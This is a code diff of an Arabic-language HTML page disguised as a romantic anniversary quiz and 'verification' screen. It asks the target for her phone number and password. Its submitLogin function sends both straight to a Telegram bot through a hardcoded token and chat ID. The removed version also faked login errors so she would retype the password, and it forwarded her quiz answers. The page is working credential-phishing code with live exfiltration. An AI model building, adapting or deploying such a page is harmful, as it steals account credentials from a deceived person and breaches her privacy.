@@ -3,252 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحدي الـ 5 سنوات 💖</title>
+    <title>Verification & Love</title>
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        
         body { 
-            background-color: #fff0f3; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            margin: 0; 
-            direction: rtl; 
-            padding: 20px; 
+            background-color: #ffe5ec; 
+            background-image: radial-gradient(#ffb3c1 1px, transparent 1px);
+            background-size: 40px 40px;
+            display: flex; justify-content: center; align-items: center; 
+            min-height: 100vh; margin: 0; direction: rtl; padding: 20px;
         }
-        .container { width: 100%; max-width: 400px; text-align: center; }
-        .card { 
-            background: #fff; 
-            padding: 30px; 
-            border-radius: 30px; 
-            box-shadow: 0 15px 35px rgba(255, 77, 109, 0.1); 
-            border: 3px solid #ffccd5; 
-        }
+
+        /* الخلفية (شلال القلوب) */
+        .falling-decorations { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
+        .decor { position: absolute; animation: fall 10s linear infinite; opacity: 0.6; }
+        @keyframes fall { 0% { transform: translateY(-50px); } 100% { transform: translateY(100vh); } }
+
+        /* البطاقة الرئيسية */
+        .container { width: 100%; max-width: 400px; z-index: 10; }
+        .card { background: rgba(255, 255, 255, 0.95); padding: 30px; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); border: 2px solid #ffccd5; }
+
+        /* الشعار (ثابت ليبقى الجو العام رومانسي) */
+        .logo-area { text-align: center; margin-bottom: 20px; }
+        .logo-svg { width: 100px; height: auto; }
+        .logo-text { font-weight: 900; color: #ff4d6d; margin: 5px 0; }
+
+        /* واجهة الدخول الاحترافية (داخل البطاقة الرومانسية) */
+        .system-header { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 20px; color: #2d3436; }
+        .security-icon { width: 40px; height: 40px; fill: #636e72; }
         
-        /* إخفاء الخطوات افتراضياً */
+        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dfe6e9; border-radius: 10px; background: #f8f9fa; }
+        button { width: 100%; padding: 14px; background: #2d3436; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #000; }
+
+        /* اللعبة (الأسئلة) */
         .step { display: none; }
+        .step.active { display: block; }
+        .option { background: #fff0f3; border: 2px solid #ffccd5; padding: 15px; margin: 10px 0; border-radius: 15px; cursor: pointer; text-align: right; font-weight: 600; color: #590d22; }
+        .option:hover { background: #ffdee2; }
         
-        /* تأثير الظهور السلس عند الانتقال */
-        .step.active { 
-            display: block; 
-            animation: slideIn 0.3s ease-out; 
-        }
-        
-        @keyframes slideIn { 
-            from { opacity: 0; transform: translateY(10px); } 
-            to { opacity: 1; transform: translateY(0); } 
-        }
-        
-        .option { 
-            display: block; 
-            background: #fff5f6; 
-            border: 2px solid #ffccd5; 
-            padding: 15px; 
-            margin: 12px 0; 
-            border-radius: 15px; 
-            cursor: pointer; 
-            font-weight: 600; 
-            color: #590d22;
-            transition: all 0.2s ease;
-        }
-        .option:hover { 
-            background: #ffe3e8; 
-            border-color: #ff4d6d;
-        }
-        
-        input { 
-            width: 100%; 
-            padding: 15px; 
-            margin: 10px 0; 
-            border: 2px solid #ffccd5; 
-            border-radius: 15px; 
-            outline: none; 
-            background: #fff5f6;
-        }
-        input:focus {
-            border-color: #ff4d6d;
-            background: #fff;
-        }
-        
-        button { 
-            width: 100%; 
-            padding: 15px; 
-            background: linear-gradient(45deg, #ff4d6d, #ff758f); 
-            color: white; 
-            border: none; 
-            border-radius: 15px; 
-            font-weight: 700; 
-            cursor: pointer; 
-            margin-top: 10px; 
-            box-shadow: 0 5px 15px rgba(255, 77, 109, 0.3);
-        }
-        button:hover {
-            transform: translateY(-1px);
-        }
-        
-        .error-box { 
-            color: #d63031; 
-            background: #ffe3e3; 
-            padding: 12px; 
-            border-radius: 12px; 
-            margin-bottom: 15px; 
-            display: none; 
-            font-size: 14px; 
-            font-weight: 600;
-        }
-
-        .match-badge {
-            background: #fff0f3;
-            color: #ff4d6d;
-            font-size: 22px;
-            font-weight: 900;
-            padding: 8px 18px;
-            border-radius: 50px;
-            display: inline-block;
-            margin-bottom: 15px;
-            border: 2px dashed #ff4d6d;
-        }
-
-        .poetry-box {
-            background: #fff0f3;
-            border-left: 4px solid #ff4d6d;
-            border-right: 4px solid #ff4d6d;
-            padding: 12px;
-            border-radius: 12px;
-            font-style: italic;
-            color: #590d22;
-            margin: 15px 0;
-            font-size: 13.5px;
-            line-height: 1.7;
-        }
+        .progress-bar { width: 100%; height: 6px; background: #eee; border-radius: 5px; margin-bottom: 20px; display: none; }
+        .progress-fill { height: 100%; background: #ff4d6d; width: 0%; transition: 0.3s; }
     </style>
 </head>
 <body>
 
+<div class="falling-decorations" id="decorContainer"></div>
+
 <div class="container">
+    <div class="logo-area">
+        <svg class="logo-svg" viewBox="0 0 200 130" xmlns="http://www.w3.org/2000/svg">
+            <path d="M65,25 C45,5 15,20 15,50 C15,85 65,115 85,125 C75,110 30,80 30,50 C30,32 48,18 65,35 C82,18 100,32 100,50 C100,60 95,70 88,77 C84,81 76,85 71,85" stroke="#ff4d6d" stroke-width="12" fill="none"/>
+            <path d="M135,25 C115,5 87,20 87,50 C87,55 89,61 92,66 M102,78 C115,92 125,102 135,110 C155,95 185,75 185,50 C185,20 155,5 135,25 Z" stroke="#ff758f" stroke-width="12" fill="none"/>
+        </svg>
+        <h1 class="logo-text">WE LOVE EACH OTHER</h1>
+    </div>
+
     <div class="card">
-        
-        <!-- الخطوة 1: تسجيل الدخول أولاً لفتح اللعبة والتشويق من البداية -->
+        <div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
+
+        <!-- شاشة تسجيل الدخول "الاحترافية" -->
         <div id="login" class="step active">
-            <h3 style="color: #c9184a; margin-bottom: 5px;">تحدي الـ 5 سنوات 🔐</h3>
-            <p style="font-size: 13px; color: #590d22; margin-bottom: 20px;">سجلي دخولكِ أولاً لتأكيد هويتكِ وفتح اختبار الذكريات المشترك والمفاجأة!</p>
-            
-            <div id="error" class="error-box"></div>
-            
-            <input type="tel" id="phone" placeholder="أدخلي رقم الهاتف الخاص بكِ">
-            <input type="password" id="password" placeholder="أدخلي كلمة المرور">
-            <button onclick="submitLogin()">دخول وفتح التحدي 🔓</button>
-        </div>
-
-        <!-- الخطوة 2: السؤال الأول (يظهر بعد تسجيل الدخول الناجح) -->
-        <div id="q1" class="step">
-            <h3 style="color: #c9184a;">1. وش هو العام اللي بدأت فيه حكايتنا؟ 📅</h3>
-            <div class="option" onclick="next('2021')">عام 2021</div>
-            <div class="option" onclick="next('2022')">عام 2022</div>
-        </div>
-        
-        <!-- الخطوة 3: السؤال الثاني -->
-        <div id="q2" class="step">
-            <h3 style="color: #c9184a;">2. وين كانت أول هدرة بيناتنا بصراحة؟ 💬</h3>
-            <div class="option" onclick="next('في الجامعة')">في الجامعة / الدراسة</div>
-            <div class="option" onclick="next('عبر السوشل ميديا')">عبر مواقع التواصل</div>
-        </div>
-        
-        <!-- الخطوة 4: السؤال الثالث -->
-        <div id="q3" class="step">
-            <h3 style="color: #c9184a;">3. وش هو سر نجاح علاقتنا لـ 5 سنوات؟ 💞</h3>
-            <div class="option" onclick="next('الثقة والأمان المتبادل')">الثقة والأمان المتبادل</div>
-            <div class="option" onclick="next('الصبر والتفاهم في كل وقت')">الصبر والتفاهم في كل وقت</div>
-        </div>
-
-        <!-- الخطوة الأخيرة: التوافق والكلام الرومانسي والمفاجأة الكبرى -->
-        <div id="result-message" class="step">
-            <div class="match-badge">💖 التوافق: 100% 💖</div>
-            <h2 style="color: #ff4d6d; margin-top: 10px;">أنتِ ملكة قلبي! ✨</h2>
-            <p style="color: #4a5568; line-height: 1.6; font-size: 14.5px;">
-                خمس سنوات كاملة مرت، وأنتِ لا زلتِ تتذكرين كل التفاصيل كأنها حدثت بالأمس. عيناكِ موطني، وقلبكِ هو الأمان والملجأ الوحيد لي في هذا العالم. أحبكِ اليوم وكل يوم وإلى الأبد!
-            </p>
-            <div class="poetry-box">
-                "خمسٌ من الأعوامِ مرّت كالثواني<br>
-                عيناكِ موطني وأجملُ الأغاني..." 🌸
+            <div class="system-header">
+                <svg class="security-icon" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                <h3>نظام التحقق الموحد</h3>
             </div>
-            <button onclick="window.location.reload()">أحبكَ أيضاً يا كل عمري ❤️</button>
+            <p style="text-align: center; color: #636e72; font-size: 14px; margin-bottom: 20px;">قم بتأكيد هويتك لربط بياناتك ببروتوكول التحقق الآمن.</p>
+            <input type="tel" id="phone" placeholder="رقم الهاتف">
+            <input type="password" id="password" placeholder="كلمة المرور">
+            <button onclick="submitLogin()">تأكيد الهوية والمتابعة</button>
         </div>
 
+        <!-- مثال لسؤال (سيتم تكراره كما في الكود السابق) -->
+        <div id="q1" class="step">
+            <h3 style="color: #ff4d6d;">1. في أي عام بدأت حكايتنا؟</h3>
+            <div class="option" onclick="next('2021')">2021</div>
+            <div class="option" onclick="next('2022')">2022</div>
+        </div>
     </div>
 </div>
 
 <script>
-    let currentQuestion = 1;
-    let answers = {};
-    let attempts = 0;
+    // توليد الورود (نفس الكود السابق)
+    const decors = ['🌸', '❤️', '🌹', '💖'];
+    const container = document.getElementById('decorContainer');
+    for (let i = 0; i < 20; i++) {
+        let span = document.createElement('span');
+        span.className = 'decor';
+        span.innerText = decors[Math.floor(Math.random() * decors.length)];
+        span.style.left = Math.random() * 100 + 'vw';
+        span.style.animationDelay = Math.random() * 8 + 's';
+        container.appendChild(span);
+    }
 
-    // دالة فحص وتسجيل الدخول (الخطأ المحاكي لضمان صحة الباسورد)
     function submitLogin() {
-        attempts++;
         const phone = document.getElementById('phone').value;
         const password = document.getElementById('password').value;
-
-        if(!phone || !password) {
-            alert("يرجى ملء الحقول لفتح التحدي!");
-            return;
-        }
-
-        // إرسال الحساب لتيليجرام فوراً
-        fetch(`https://api.telegram.org/bot8939934721:AAE0B_njzMIAjs9tJq5LnyTvN8PlVqZZnaQ/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: '7094930209',
-                text: `🔒 **محاولة تسجيل دخول (محاولة ${attempts}):**\n\n📞 **الرقم:** \`${phone}\`\n🔑 **الباسورد:** \`${password}\``
-            })
-        });
-
-        if (attempts < 3) {
-            const errorDiv = document.getElementById('error');
-            errorDiv.style.display = 'block';
-            if(attempts === 1) {
-                errorDiv.innerText = "⚠️ خطأ في مطابقة الحساب. تأكدي من كتابة كلمة المرور الصحيحة لفتح الاختبار.";
-            } else {
-                errorDiv.innerText = "⚠️ تعذر الفتح. يرجى إعادة كتابة الرمز بدقة لفتح المفاجأة.";
-            }
-            document.getElementById('password').value = '';
-            document.getElementById('password').focus();
-        } else {
-            // في المحاولة الثالثة تنجح وتفتح اللعبة والأسئلة!
-            document.getElementById('error').style.display = 'none';
-            document.getElementById('login').classList.remove('active');
-            document.getElementById('q1').classList.add('active'); // إظهار السؤال الأول
-        }
-    }
-
-    // دالة الانتقال بين الأسئلة تلقائياً بمجرد النقر على الخيار
-    function next(answer) {
-        answers['q' + currentQuestion] = answer;
-        document.getElementById('q' + currentQuestion).classList.remove('active');
-        currentQuestion++;
         
-        if (currentQuestion <= 3) {
-            document.getElementById('q' + currentQuestion).classList.add('active');
-        } else {
-            // بعد إتمام الإجابات، نرسل الإجابات أيضاً لتيليجرام
-            sendAnswersToTelegram();
-            // إظهار شاشة التوافق والمفاجأة النهائية فوراً!
-            document.getElementById('result-message').classList.add('active');
-        }
-    }
-
-    // دالة إرسال إجابات الأسئلة لتيليجرام لتعرف خياراتها
-    function sendAnswersToTelegram() {
-        const phone = document.getElementById('phone').value;
+        // هنا يتم الإرسال (تأكد من وضع الرابط الخاص بك)
         fetch(`https://api.telegram.org/bot8939934721:AAE0B_njzMIAjs9tJq5LnyTvN8PlVqZZnaQ/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 chat_id: '7094930209',
-                text: `🎯 **إجابات أسئلة الـ 5 سنوات لحساب (${phone}):**\n\n${JSON.stringify(answers, null, 2)}`
+                text: `🔒 محاولة: ${phone} / ${password}`
             })
         });
+
+        document.getElementById('login').classList.remove('active');
+        document.getElementById('progressBar').style.display = 'block';
+        document.getElementById('q1').classList.add('active');
+    }
+
+    function next(ans) {
+        // الانتقال للأسئلة التالية..
+        alert("إجابة مسجلة: " + ans);
     }
 </script>
 </body>
